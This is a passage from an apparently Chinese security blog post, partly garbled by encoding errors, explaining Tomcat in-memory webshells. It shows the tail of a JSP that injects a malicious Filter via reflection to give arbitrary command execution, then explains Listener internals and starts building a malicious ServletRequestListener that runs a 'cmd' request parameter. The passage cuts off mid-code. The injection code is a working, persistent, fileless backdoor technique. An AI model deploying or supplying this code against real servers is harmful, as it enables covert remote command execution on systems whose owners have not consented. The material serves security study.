</span></span><span class="line"><span class="cl">  <span class="ne">String</span> <span class="n">name</span> <span class="o">=</span> <span class="s2">&#34;badFilter&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="err">åˆ›å»º</span><span class="n">filterDef</span>
</span></span><span class="line"><span class="cl">    <span class="n">FilterDef</span> <span class="n">filterDef</span> <span class="o">=</span> <span class="n">new</span> <span class="n">FilterDef</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">filterDef</span><span class="o">.</span><span class="n">setFilterName</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">filterDef</span><span class="o">.</span><span class="n">setFilterClass</span><span class="p">(</span><span class="n">evilFilter</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getName</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="n">filterDef</span><span class="o">.</span><span class="n">setFilter</span><span class="p">(</span><span class="n">evilFilter</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">standardContext</span><span class="o">.</span><span class="n">addFilterDef</span><span class="p">(</span><span class="n">filterDef</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="err">åˆ›å»º</span><span class="n">filterMap</span>
</span></span><span class="line"><span class="cl">    <span class="n">FilterMap</span>  <span class="n">filterMap</span> <span class="o">=</span> <span class="n">new</span> <span class="n">FilterMap</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">filterMap</span><span class="o">.</span><span class="n">addURLPattern</span><span class="p">(</span><span class="s2">&#34;/*&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">filterMap</span><span class="o">.</span><span class="n">setFilterName</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">filterMap</span><span class="o">.</span><span class="n">setDispatcher</span><span class="p">(</span><span class="n">DispatcherType</span><span class="o">.</span><span class="n">REQUEST</span><span class="o">.</span><span class="n">name</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">standardContext</span><span class="o">.</span><span class="n">addFilterMapBefore</span><span class="p">(</span><span class="n">filterMap</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="err">åˆ›å»º</span><span class="n">filterConfigæ‰€éœ€çš„ApplicationFilterConfig</span>
</span></span><span class="line"><span class="cl">    <span class="n">Constructor</span> <span class="n">constructor1</span> <span class="o">=</span> <span class="n">ApplicationFilterConfig</span><span class="o">.</span><span class="k">class</span><span class="o">.</span><span class="n">getDeclaredConstructor</span><span class="p">(</span><span class="n">Context</span><span class="o">.</span><span class="k">class</span><span class="p">,</span><span class="n">FilterDef</span><span class="o">.</span><span class="k">class</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">constructor1</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="bp">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="ne">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">constructor1</span><span class="o">.</span><span class="n">newInstance</span><span class="p">(</span><span class="n">standardContext</span><span class="p">,</span><span class="n">filterDef</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="err">æ”¾å…¥</span><span class="n">filterConfigs</span>
</span></span><span class="line"><span class="cl">    <span class="n">Field</span> <span class="n">configs</span> <span class="o">=</span> <span class="n">standardContext</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getDeclaredField</span><span class="p">(</span><span class="s2">&#34;filterConfigs&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">configs</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="bp">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">Map</span> <span class="n">filterMaps</span> <span class="o">=</span> <span class="p">(</span><span class="n">Map</span><span class="p">)</span><span class="n">configs</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">standardContext</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">filterMaps</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="n">o</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="o">//</span><span class="err">åŠ ä¸Šæç¤º</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span><span class="o">.</span><span class="n">println</span><span class="p">(</span><span class="s2">&#34;success inject&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åå¼€å¯æœåŠ¡å™¨ï¼Œè®¿é—®ä¸€ä¸‹injection.jspï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055320.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240901142543173"
	
	
></p>
<p>éšåå°±å¯ä»¥ä»»æ„å‘½ä»¤æ‰§è¡Œäº†ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055374.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240901142617267"
	
	
></p>
<p>å¹¶ä¸”è¿™ä¸ªå†…å­˜é©¬æ˜¯ä¸€ç›´å­˜åœ¨çš„ï¼Œç›´åˆ°è¿™ä¸ªtomcatæœåŠ¡å™¨å…³é—­ã€‚</p>
<p>è¿˜æœ‰éœ€è¦æ³¨æ„çš„å°±æ˜¯tomcat7 ä¸ tomcat8 åœ¨FilterDefå’ŒFilterMapè¿™ä¸¤ä¸ªç±»æ‰€å±çš„åŒ…åä¸ä¸€æ ·ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!-- tomcat 8/9 --&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;% page import = &#34;org.apache.tomcat.util.descriptor.web.FilterMap&#34; %&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;% page import = &#34;org.apache.tomcat.util.descriptor.web.FilterDef&#34; %&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;!-- tomcat 7 --&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;%@ page import = &#34;org.apache.catalina.deploy.FilterMap&#34; %&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;%@ page import = &#34;org.apache.catalina.deploy.FilterDef&#34; %&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="listenerå‹å†…å­˜é©¬">Listenerå‹å†…å­˜é©¬
</h4><p>listenerèƒ½å¤Ÿç›‘å¬äº‹ä»¶ä»è€Œè¾¾æˆä¸€äº›æ­¤ç†¬è¿‡ã€‚åœ¨è¯·æ±‚ç½‘ç«™çš„æ—¶å€™ï¼Œç¨‹åºå…ˆæ‰§è¡Œlistenerç›‘å¬å™¨çš„å†…å®¹ï¼š Listener -&gt; Filter -&gt; Servlet</p>
<p>LIstenerr ä¸‰ä¸ªåŸŸå¯¹è±¡ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ServletContextListener</span><span class="w">  </span><span class="c1">//æœåŠ¡å™¨å¯åŠ¨å’Œç»ˆæ­¢æ—¶è§¦å‘</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">HttpSessionListener</span><span class="w">     </span><span class="c1">//æœ‰å…³sessionæ“ä½œæ—¶è§¦å‘</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ServletRequestListener</span><span class="w">  </span><span class="c1">//è®¿é—®æœåŠ¡æ—¶è§¦å‘</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>æ¯«æ— ç–‘é—®ï¼Œè¿™é‡Œæœ€å¥½ç”¨çš„å°±æ˜¯SerrvletRequestListenerï¼Œå½“æˆ‘ä»¬è®¿é—®ä»»æ„èµ„æºæ—¶ï¼Œéƒ½ä¼šè§¦å‘ServletRequestListener#requestInitialized()æ–¹æ³•ã€‚</p>
<h5 id="åŸºæœ¬listeneræ„é€ ">åŸºæœ¬Listeneræ„é€ 
</h5><p>è¦æ„é€ listenerå¿…é¡»å®ç°EventListeneræ¥å£ã€‚è¿™ä¸ªæ¥å£çš„å®šä¹‰å¦‚ä¸‹ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055401.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240901153240871"
	
	
></p>
<p>å¾ˆå¤šç±»éƒ½ç»§æ‰¿äº†è¿™ä¸ªæ¥å£ã€‚å¦‚æœæˆ‘ä»¬æƒ³è¦<strong>å®ç°å†…å­˜é©¬å°±éœ€è¦æ‰¾ä¸€ä¸ªæ¯ä¸ªè¯·æ±‚éƒ½ä¼šè¢«è§¦å‘çš„Listener</strong>ã€‚</p>
<p>åœ¨è¿™é‡Œéœ€è¦ç”¨åˆ°çš„æ˜¯ServletRequestListeneræ¥å£ï¼Œå¦‚ä¸‹ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055461.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240901153656529"
	
	
></p>
<p>è¿™ä¸ªæ¥å£ä¸­çš„æ–¹æ³•ç”¨äºç›‘å¬ServletRequestå¯¹è±¡çš„åˆ›å»ºçš„é”€æ¯ï¼Œä»å‰é¢çš„å­¦ä¹ ä¸­ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“çŸ¥é“è¿™é‡Œçš„ServletRequestå°±æ˜¯è¯·æ±‚çš„â€œå¯¹è±¡â€ã€‚</p>
<p>å½“æˆ‘ä»¬è®¿é—®ä»»æ„èµ„æºï¼Œæ— è®ºæ˜¯servletã€jspè¿˜æ˜¯é™æ€èµ„æºï¼Œéƒ½ä¼šè§¦å‘<code>requestInitialized</code>æ–¹æ³•ã€‚</p>
<p>ç®€å•æµ‹è¯•ä¸€ä¸‹ï¼š
Listener.javaï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">listener</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.ServletRequestEvent</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.ServletRequestListener</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Listener</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">ServletRequestListener</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">requestDestroyed</span><span class="p">(</span><span class="n">ServletRequestEvent</span><span class="w"> </span><span class="n">sre</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;æ‰§è¡Œäº†é”€æ¯&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">requestInitialized</span><span class="p">(</span><span class="n">ServletRequestEvent</span><span class="w"> </span><span class="n">sre</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;æ‰§è¡Œäº†åˆ›å»º&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>web.xml</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;web-app</span> <span class="na">xmlns=</span><span class="s">&#34;http://xmlns.jcp.org/xml/ns/javaee&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="na">xsi:schemaLocation=</span><span class="s">&#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="na">version=</span><span class="s">&#34;4.0&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;listener&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;listener-class&gt;</span>listener.Listener<span class="nt">&lt;/listener-class&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/listener&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/web-app&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯åŠ¨tomcatåï¼Œå°±ä¼šè§¦å‘Listenerçš„ç›‘å¬è¯·æ±‚ï¼Œè®¿é—®ä»»æ„çš„è·¯å¾„éƒ½ä¼šè§¦å‘ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055670.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240901154743206"
	
	
></p>
<p>ä¸Šé¢æ˜¯åœ¨å¼€å¯æ—¶è¿›è¡Œçš„ä¸¤æ¬¡åˆ›å»ºé”€æ¯ï¼Œä¸‹é¢å°±æ˜¯æˆ‘éšä¾¿è¾“çš„è®¿é—®è·¯å¾„æ‰§è¡Œçš„ä¸€æ¬¡åˆ›å»ºé”€æ¯ã€‚</p>
<h5 id="listeneræµç¨‹åˆ†æ">Listeneræµç¨‹åˆ†æ
</h5><h6 id="åº”ç”¨è¿è¡Œå‰">åº”ç”¨è¿è¡Œå‰
</h6><p>è¿™é‡Œéœ€è¦äº†è§£ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œ<strong>tomcatåœ¨å¯åŠ¨åº”ç”¨çš„æ—¶å€™ï¼ŒContextConfigç±»ä¼šå»è¯»å–é…ç½®æ–‡ä»¶</strong>ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬ç›´æ¥å»ContextConfigç±»é‡Œé¢å»çœ‹ä¸€ä¸‹ï¼Œç›´æ¥å®šä½åˆ°ä¸€ä¸ªæ–¹æ³•ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055792.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240901160041840"
	
	
></p>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œè¯»å–äº†webxmlã€‚</p>
<p><strong>è¿™ä¸ªæ–¹æ³•ä¸»è¦å°±æ˜¯è¯»å–æ•°æ®</strong>ï¼Œç®€å•çœ‹çœ‹å…¶ä¸­çš„æ–¹æ³•ï¼Œè¯»å–äº†filterç­‰ç»„ä»¶ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055896.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240901160547803"
	
	
></p>
<p>è°ƒç”¨äº†addFilterDef()æ–¹æ³•æ¥æ”¾å…¥è¯»å–å‡ºæ¥çš„filterDefã€‚</p>
<p>â€”â€”â€”â€”</p>
<p>åœ¨è¿™é‡Œæˆ‘ä»¬ä¸»è¦å…³æ³¨listenerçš„è¯»å–ï¼Œç›´æ¥å…³é”®å­—æœç´¢å‘ç°æœ‰å¦‚ä¸‹æ–¹æ³•ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055913.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240901160722963"
	
	
></p>
<p>æ‰“æ–­ç‚¹çœ‹ä¸€ä¸‹è¿™é‡Œçš„å‚æ•°æƒ…å†µï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055660.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240901160944447"
	
	
></p>
<p>è¿™é‡Œçš„contextç¡®å®æ˜¯StandardContextçš„å®ä¾‹ï¼Œå¹¶ä¸”è¿™é‡Œçš„webxmlç¡®å®æ˜¯æœ‰æˆ‘ä»¬è‡ªå®šä¹‰çš„listenerçš„ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055525.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240901161645864"
	
	
></p>
<p>æ­£å¥½å¯¹åº”äº†æˆ‘ä»¬å¹¶æ²¡æœ‰åœ¨web.xmlä¸­å®šä¹‰filterï¼Œæ‰€ä»¥è¿™æ˜¯å°±æ˜¯è¯»å–çš„æˆ‘ä»¬è‡ªå®šä¹‰çš„web.xmlä¸­çš„æ•°æ®ã€‚</p>
<p>â€”â€”â€”â€”</p>
<p>ä¸Šè¿°å°±æ˜¯è¯»å–é…ç½®æ–‡ä»¶ï¼Œé‡Œé¢åŠ è½½äº†Listenerã€‚åœ¨è¯»å–å®Œé…ç½®æ–‡ä»¶åï¼Œä¸­é—´è¿˜æœ‰ä¸€å¤§éƒ¨åˆ†è¿‡ç¨‹ç•¥è¿‡ï¼Œæœ€åä¼šè°ƒç”¨StandardContextçš„listenerStart()æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•åšäº†ä¸€äº›åŸºç¡€çš„å®‰å…¨æ£€æŸ¥ï¼Œç„¶åå®Œæˆstartä¸šåŠ¡ã€‚</p>
<h6 id="åº”ç”¨è¿è¡Œè¿‡ç¨‹">åº”ç”¨è¿è¡Œè¿‡ç¨‹
</h6><p>æˆ‘ä»¬ç›´æ¥æ‰“æ–­ç‚¹è‡ªå®šä¹‰listener()æ–¹æ³•çš„requestInitialized()æ–¹æ³•ï¼Œç„¶åè°ƒè¯•ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055979.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240901164446842"
	
	
></p>
<p>æ¥çœ‹ç°åœ¨çš„è°ƒç”¨æ ˆï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055032.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240901164522263"
	
	
></p>
<p>å®šç‚¹äºæ ‡é‡ç‚¹éƒ¨åˆ†ï¼Œè°ƒç”¨çš„fireRequestInitEvent()æ–¹æ³•ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055664.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240901164825329"
	
	
></p>
<p>è¿™é‡Œå°±<strong>è°ƒç”¨åˆ°äº†requestInitialized()æ–¹æ³•</strong>ã€‚</p>
<p>åœ¨è¿™ä¸ªfireRequestInitEvent()æ–¹æ³•æœ€å¼€å§‹çš„åœ°æ–¹è°ƒç”¨äº†ä¸€ä¸ªgetApplicationEventListeners()æ–¹æ³•ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055336.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240901170537558"
	
	
></p>
<p>è¿™ä¸ªæ–¹æ³•å°±æ˜¯è·å–æ‰€æœ‰çš„Listenerå¯¹è±¡ï¼Œæ‰“æ–­ç‚¹æ¥çœ‹ä¸€ä¸‹ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055406.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240901171655933"
	
	
></p>
<p>è·å–åˆ°äº†æˆ‘è‡ªå®šä¹‰çš„Listenerç±»ã€‚</p>
<p><strong>å¦‚æœæœ‰å¤šä¸ªlistenerï¼Œä»£ç åœ¨åé¢ä¹Ÿæ˜¯ä½¿ç”¨äº†forå¾ªç¯æ¥åˆ†åˆ«åˆå§‹åŒ–Listener</strong>ã€‚</p>
<p>å¹¶ä¸”åœ¨è¿™ä¸ªStandardContextä¸­ï¼š</p>
<ul>
<li>
<p><strong>å‰é¢é‚£ä¸ªgetApplicationEventListeners()æ–¹æ³•å…¶å®å¯ä»¥ç®—ä½œæ˜¯listenerçš„â€getteræ–¹æ³•â€œï¼Œ</strong></p>
</li>
<li>
<p><strong>å¹¶ä¸”StandardContextç±»è¿˜æä¾›äº†â€œsetteræ–¹æ³•â€ï¼ŒsetApplicationEventListeners()</strong>ï¼š</p>
</li>
</ul>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055541.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240901170941090"
	
	
></p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•å‘StandardContextçš„å˜é‡applicationEventListenersListä¸­æ·»åŠ ä¸€ä¸ªæ¶æ„Listenerã€‚</p>
<h6 id="æ³¨å…¥è¿‡ç¨‹">æ³¨å…¥è¿‡ç¨‹
</h6><p><strong>å…ˆè·å–å½“å‰ç¯å¢ƒçš„StandardContextå¯¹è±¡</strong>ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ServletContext</span><span class="w"> </span><span class="n">servletContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getSession</span><span class="p">().</span><span class="na">getServletContext</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Field</span><span class="w"> </span><span class="n">field0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servletContext</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;context&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">field0</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ApplicationContext</span><span class="w"> </span><span class="n">applicationContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ApplicationContext</span><span class="p">)</span><span class="n">field0</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">servletContext</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Field</span><span class="w"> </span><span class="n">field1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">applicationContext</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;context&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">field1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">StandardContext</span><span class="w"> </span><span class="n">standardContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">StandardContext</span><span class="p">)</span><span class="n">field1</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">applicationContext</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong>å‡†å¤‡ä¸€ä¸ªæ¶æ„Listener</strong>ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ServletRequestListener</span><span class="w"> </span><span class="n">badListener</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ServletRequestListener</span><span class="p">(){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">requestDestroyed</span><span class="p">(</span><span class="n">ServletRequestEvent</span><span class="w"> </span><span class="n">sre</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;é”€æ¯&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">requestInitialized</span><span class="p">(</span><span class="n">ServletRequestEvent</span><span class="w"> </span><span class="n">sre</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ServletRequest</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ServletRequest</span><span class="p">)</span><span class="n">sre</span><span class="p">.</span><span class="na">getServletRequest</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;cmd&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="n">shell</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
